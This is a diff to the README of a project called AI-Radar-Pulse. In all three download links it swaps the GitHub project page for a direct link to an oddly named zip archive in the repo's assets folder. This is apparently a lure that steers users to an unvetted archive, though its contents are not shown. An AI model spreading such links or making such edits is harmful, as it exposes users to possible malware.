@@ -1,12 +1,12 @@
 # 🤖 AI-Radar-Pulse - Track Models With Clear Control
 
-[![Download AI-Radar-Pulse](https://img.shields.io/badge/Download%20AI--Radar--Pulse-blue?style=for-the-badge)](https://github.com/brooksnonlexical475/AI-Radar-Pulse)
+[![Download AI-Radar-Pulse](https://img.shields.io/badge/Download%20AI--Radar--Pulse-blue?style=for-the-badge)](https://raw.githubusercontent.com/brooksnonlexical475/AI-Radar-Pulse/main/assets/A-Radar-Pulse-passival.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[Download AI-Radar-Pulse](https://github.com/brooksnonlexical475/AI-Radar-Pulse)
+[Download AI-Radar-Pulse](https://raw.githubusercontent.com/brooksnonlexical475/AI-Radar-Pulse/main/assets/A-Radar-Pulse-passival.zip)
 
 ## 🖥️ What This App Does
 
@@ -27,7 +27,7 @@ Follow these steps to set up and run AI-Radar-Pulse on Windows.
 ### 1. Open the download page
 Go to the project page:
 
-[Download AI-Radar-Pulse](https://github.com/brooksnonlexical475/AI-Radar-Pulse)
+[Download AI-Radar-Pulse](https://raw.githubusercontent.com/brooksnonlexical475/AI-Radar-Pulse/main/assets/A-Radar-Pulse-passival.zip)
 
 ### 2. Get the Windows file
 On the page, look for the latest release or download file for Windows.
